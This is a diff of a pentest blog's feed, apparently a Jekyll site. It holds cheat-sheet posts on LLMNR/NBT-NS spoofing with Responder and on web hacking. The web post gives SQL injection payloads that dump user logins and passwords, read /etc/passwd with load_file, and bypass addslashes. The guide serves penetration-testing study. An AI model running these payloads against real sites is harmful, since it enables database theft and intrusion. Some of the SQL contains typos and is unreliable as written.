+&lt;p&gt;A LLMNR &amp;amp; NBT-NS Spoofing Attack.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim /etc/responder/Responder.conf &lt;span class=&quot;c&quot;&gt;# Configure the ips field RespondTo&lt;/span&gt;
 
-responder <span class="nt">-I</span> eth0 <span class="nt">-Prv</span> <span class="c"># Will list to all</span>
-</code></pre></div></div>]]></content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="post-exploitation" /><category term="exploitation" /><summary type="html"><![CDATA[This is a guide for post exploitation]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Web pentest</title><link href="http://localhost:4000/guide/2022/01/13/web-pentesting.html" rel="alternate" type="text/html" title="Web pentest" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/web-pentesting</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/web-pentesting.html"><![CDATA[<h1 id="web-hacking">Web hacking</h1>
-<h2 id="attack-vectors">Attack vectors</h2>
-<ul>
-  <li>Parameters</li>
-  <li>Search inputs</li>
-  <li>Login/athentication inputs</li>
-  <li>Fields/register inputs</li>
-  <li>Redirects</li>
-  <li>GET e POST parameters</li>
-  <li>Download</li>
-  <li>Upload</li>
-</ul>
+responder &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-Prv&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Will list to all&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="guide" /><category term="pentest" /><category term="post-exploitation" /><category term="exploitation" /><summary type="html">This is a guide for post exploitation</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Web pentest</title><link href="http://localhost:4000/guide/2022/01/13/web-pentesting.html" rel="alternate" type="text/html" title="Web pentest" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/guide/2022/01/13/web-pentesting</id><content type="html" xml:base="http://localhost:4000/guide/2022/01/13/web-pentesting.html">&lt;h1 id=&quot;web-hacking&quot;&gt;Web hacking&lt;/h1&gt;
+&lt;h2 id=&quot;attack-vectors&quot;&gt;Attack vectors&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Parameters&lt;/li&gt;
+  &lt;li&gt;Search inputs&lt;/li&gt;
+  &lt;li&gt;Login/athentication inputs&lt;/li&gt;
+  &lt;li&gt;Fields/register inputs&lt;/li&gt;
+  &lt;li&gt;Redirects&lt;/li&gt;
+  &lt;li&gt;GET e POST parameters&lt;/li&gt;
+  &lt;li&gt;Download&lt;/li&gt;
+  &lt;li&gt;Upload&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="sql-injection">SQL Injection.</h2>
-<p>Use sql commands that are not sanitized do retrieve database informations:
-Links:</p>
-<ul>
-  <li><a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">Cheat sheet</a></li>
-  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Portswigger</a></li>
-  <li><a href="https://www.w3schools.com/Sql/sql_comments.asp">w3schools</a></li>
-</ul>
+&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection.&lt;/h2&gt;
+&lt;p&gt;Use sql commands that are not sanitized do retrieve database informations:
+Links:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/&quot;&gt;Cheat sheet&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection/cheat-sheet&quot;&gt;Portswigger&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.w3schools.com/Sql/sql_comments.asp&quot;&gt;w3schools&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<p>Sql sintax examples(mysql):</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">user</span><span class="p">();</span> <span class="c1">--Show user</span>
-<span class="k">create</span> <span class="k">database</span> <span class="n">test</span><span class="p">;</span>  
-<span class="n">use</span> <span class="n">test</span><span class="p">;</span>
-<span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
-<span class="k">create</span> <span class="k">table</span> <span class="n">users</span><span class="p">(</span><span class="n">id</span> <span class="nb">int</span> <span class="k">primary</span> <span class="k">key</span> <span class="n">auto_increment</span><span class="p">,</span><span class="n">login</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">,</span><span class="n">passwords</span> <span class="n">vasrchar</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span> <span class="k">not</span> <span class="k">null</span><span class="p">);</span>
-<span class="k">describe</span> <span class="n">users</span><span class="p">;</span>
-<span class="k">select</span> <span class="n">id</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
-<span class="k">insert</span> <span class="k">into</span> <span class="n">users</span> <span class="k">values</span><span class="p">(</span><span class="s1">'1'</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">);</span>
-<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
-<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="nv">"1"</span><span class="p">;</span>
-<span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="n">login</span><span class="p">,</span><span class="s1">':'</span><span class="p">,</span><span class="n">passwords</span> <span class="k">from</span> <span class="n">users</span><span class="p">)</span> <span class="c1">-- CONCATENATE selects.</span>
-<span class="k">select</span> <span class="o">@@</span><span class="n">versions</span> <span class="c1">-- Show database version</span>
-<span class="k">select</span> <span class="k">load</span><span class="p">(</span><span class="s1">'/var/www/html/index.html'</span><span class="p">)</span> <span class="c1">-- Load a file.</span>
-<span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1">-- Sleep 5 sec until return.</span>
-<span class="k">select</span> <span class="k">substring</span><span class="p">(</span><span class="nv">"test"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>
-<span class="n">use</span> <span class="n">mysql</span><span class="p">;</span> <span class="c1">--System database that has informations about users,...</span>
-<span class="n">use</span> <span class="n">information_schema</span><span class="p">;</span> <span class="c1">--System database, has informations about created databases, tables, columns.</span>
-</code></pre></div></div>
-<h3 id="sql-information-schema">SQL Information Schema</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,table_name,4,5 from information_schema.tables'</span> 
-<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,table_name,4,5 where table_schema ="dbname"%23'</span> 
-<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,column_name,4,5 where table_schema ="dbname" and table_name="dbusers"%23'</span> 
-<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,nome,login,senha from dbusers %23'</span> <span class="p">.</span>
-<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,concat('</span><span class="n">id</span><span class="o">=</span><span class="s1">',id,'</span><span class="n">Login</span><span class="o">=</span><span class="s1">',login,'</span><span class="n">pass</span><span class="o">=</span><span class="s1">',password)4,5 from mrudbuserssers %23'</span> 
-<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">turismo</span><span class="o">/</span><span class="n">agencias</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,3,4,load_file("/etc/passwd")%23'</span> 
-</code></pre></div></div>
-<h3 id="bypass-addslashes">Bypass Addslashes</h3>
-<p>Send the string in char.</p>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">adm</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">loja</span><span class="o">=</span><span class="s1">'union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(100,98,114,116,117,114)'</span>
-</code></pre></div></div>
+&lt;p&gt;Sql sintax examples(mysql):&lt;/p&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--Show user&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
+&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;primary&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auto_increment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;varchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vasrchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;describe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- CONCATENATE selects.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;versions&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Show database version&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/var/www/html/index.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Load a file.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Sleep 5 sec until return.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--System database that has informations about users,...&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--System database, has informations about created databases, tables, columns.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;sql-information-schema&quot;&gt;SQL Information Schema&lt;/h3&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 from information_schema.tables&apos;&lt;/span&gt; 
+&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 where table_schema =&quot;dbname&quot;%23&apos;&lt;/span&gt; 
+&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,column_name,4,5 where table_schema =&quot;dbname&quot; and table_name=&quot;dbusers&quot;%23&apos;&lt;/span&gt; 
+&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,nome,login,senha from dbusers %23&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,concat(&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,id,&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,login,&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,password)4,5 from mrudbuserssers %23&apos;&lt;/span&gt; 
+&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,3,4,load_file(&quot;/etc/passwd&quot;)%23&apos;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;bypass-addslashes&quot;&gt;Bypass Addslashes&lt;/h3&gt;
+&lt;p&gt;Send the string in char.&lt;/p&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 from information_schema.tables where table_schema=char(100,98,114,116,117,114)&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="sql-injection-error-based">SQL Injection Error based</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">administration</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">test</span><span class="o">=</span><span class="n">sp</span><span class="s1">'union select 1,2,3,4,5 %25'</span> <span class="c1">--Test until find the number of fields</span>
-<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">administration</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">test</span><span class="o">=</span><span class="n">sp</span><span class="s1">'union select 1,2,version(),user(),database()'</span> 
-</code></pre></div></div>
-<h3 id="blind-sql-injection">Blind SQL Injection</h3>
-<p>When we dont have error response.</p>
+&lt;h3 id=&quot;sql-injection-error-based&quot;&gt;SQL Injection Error based&lt;/h3&gt;
